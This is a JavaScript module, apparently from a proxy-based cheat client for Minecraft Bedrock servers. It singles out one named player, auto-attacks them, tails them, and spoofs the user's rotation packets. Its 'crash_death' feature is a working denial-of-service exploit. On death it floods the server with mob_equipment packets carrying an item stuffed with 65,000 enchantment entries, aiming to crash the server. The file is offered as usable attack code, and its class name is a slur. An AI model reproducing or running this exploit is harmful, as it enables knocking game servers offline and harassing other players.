const Module = require('../Module');
const {Vector3} = require("../../../utils/math/Vector3");
const MathJS = require("../../../utils/MathJS");
const Others = require("../../../utils/math/Others");
const CameraSet = require("../../packet/camera/options/CameraSet");
const CameraEase = require("../../packet/camera/options/flag/CameraEase");
const CameraPos = require("../../packet/camera/options/flag/CameraPos");
const CameraRot = require("../../packet/camera/options/flag/CameraRot");
const Vector2 = require("../../../utils/math/Vector2");
const CameraPreset = require("../../packet/camera/options/flag/CameraPreset");
const Presets = require("../../packet/camera/Presets");
const CameraData = require("../../packet/camera/CameraData");
const EasyProxyPosition = require("../../../utils/EasyProxyPosition");
class BigBitch extends Module
{
    bigbitchCrash = false;
    bigbitchCrashInterval = undefined;
    enchants = [];
    constructor(session) {
        super(session, "BigBitch", {target: "unknown", focus: false, behind_head: false, third_person: false, crash_death: false});

        for (let i = 0; i < 65000; i++){
            this.enchants.push({
                id: {type: "short", value: 20},
                lvl: {type: "short", value: 3}
            });
        }
    }

    onUpdate(data)
    {
        this.flags.target = this.cleanValue(data.bigbitch_target, "unknown");
        this.flags.focus = data.bigbitch_focus === "on";
        this.flags.behind_head = data.bigbitch_behindhishead === "on";
        this.flags.derp = data.bigbitch_client_derp === "on";
        this.flags.third_person = data.bigbitch_third_person === "on";
        this.flags.crash_death = data.bigbitch_crash_death === "on";

        if(!this.flags.crash_death) {
            if(this.bigbitchCrashInterval !== undefined) {
                clearInterval(this.bigbitchCrashInterval);
                this.bigbitchCrashInterval = undefined;
                this.bigbitchCrash = false;
            }
        }
    }

    onTick()
    {
        if(this.existBigBitchTarget()) {
            let target = this.getBigBitchTarget();
            let targetPos = target.getPosition();
            if (this.session.getPosition().distance(targetPos) <= 12) {
                this.session.attack(target);
            }

            let sessionPos = this.session.getPosition();
            if (this.flags.focus && this.flags.behind_head && targetPos.distance(sessionPos) <= 15) {
                let yaw = target.getRotation().getX();
                let pitch = target.getRotation().getZ();
                let directionVector = new EasyProxyPosition({
                    x: targetPos.x,
                    y: targetPos.y,
                    z: targetPos.z,
                    yaw: yaw,
                    pitch: pitch
                }).getDirectionVector();
                let newPos = new Vector3(targetPos.getX() + (-(directionVector.x * 5)), targetPos.y, targetPos.z + (-(directionVector.z * 5)));

                this.session.move(newPos, this.session.yaw, this.session.pitch, "normal");
            } else if (this.flags.focus) {
                let targetPos = target.getPosition();
                if (targetPos.distance(sessionPos) >= 6) {
                    let newPos = this.session.getPositionForMoveToPosition(targetPos, 0.85);
                    newPos.y = targetPos.getY();
                    this.session.move(newPos, this.session.yaw, this.session.pitch, "normal");
                }
            }
        }
    }

    handlePacket(type, packet)
    {
        if(type === "serverbound") {
            if(packet.name === "player_auth_input") {
                if(this.existBigBitchTarget()) {
                    let target = this.getBigBitchTarget();
                    let sessionPos = this.session.getPosition();
                    let targetPos = target.getPosition();

                    if(this.flags.derp) {
                        packet.params.yaw = MathJS.rand(-180, 180);
                        packet.params.pitch = MathJS.rand(-180, 180);
                    } else {
                        let vector = Others.calculateAgreedDirection(targetPos, sessionPos);
                        packet.params.yaw = vector.x;
                        packet.params.pitch = vector.z;
                    }

                    if(this.flags.third_person) {
                        let vector = Others.calculateAgreedDirection(targetPos, sessionPos);
                        let yaw = vector.x;
                        let pitch = vector.z;

                        let cameraSet = new CameraSet();
                        cameraSet.add(new CameraEase(1, "linear"));
                        cameraSet.add(new CameraPos(sessionPos));
                        cameraSet.add(new CameraRot(new Vector2(yaw, pitch)));
                        cameraSet.add(new CameraPreset(Presets.TAG_THIRD_PERSON));
                        this.session.sendCameraInstruction(new CameraData(cameraSet));
                    }
                }
            }
        }else if(type === "clientbound") {
            if(packet.name === "death_info") {
                if(this.flags.crash_death && this.existBigBitchTarget()) {
                    this.bigbitchCrash = true;
                    this.crash();
                }
            }
        }
    }

    existBigBitchTarget()
    {
        return this.getBigBitchTarget() !== null;
    }

    /**
     *
     * @returns {null|PlayerEntity}
     */
    getBigBitchTarget()
    {
        let find = null;
        this.session.playersEntities.forEach((entity) => {
            if(entity.getName() === this.flags.target) {
                find = entity;
                return find;
            }
        });
        return find;
    }

    crash()
    {
        if(!this.bigbitchCrash) return;
        if(this.bigbitchCrashInterval === undefined) {
            this.bigbitchCrashInterval = setInterval(() => {
                this.crash();
            });
            return;
        }

        this.sendUpstreamDataPacket('mob_equipment', {
            runtime_entity_id: MathJS.rand(1, 500),
            item: {
                network_id: 318,
                count: 1,
                metadata: 0,
                has_stack_id: 0,
                block_runtime_id: 0,
                extra: {
                    has_nbt: true,
                    nbt: {
                        version: 1,
                        nbt: {
                            type: "compound",
                            name: "",
                            value: {
                                ench: {
                                    type: "list",
                                    value: {
                                        type: "compound",
                                        value: this.enchants
                                    }
                                }
                            }
                        }
                    },
                    can_place_on: [],
                    can_destroy: []
                }
            },
            slot: this.session.hotbarSlot,
            selected_slot: this.session.hotbarSlot,
            window_id: "inventory"
        });
    }
}
module.exports = BigBitch;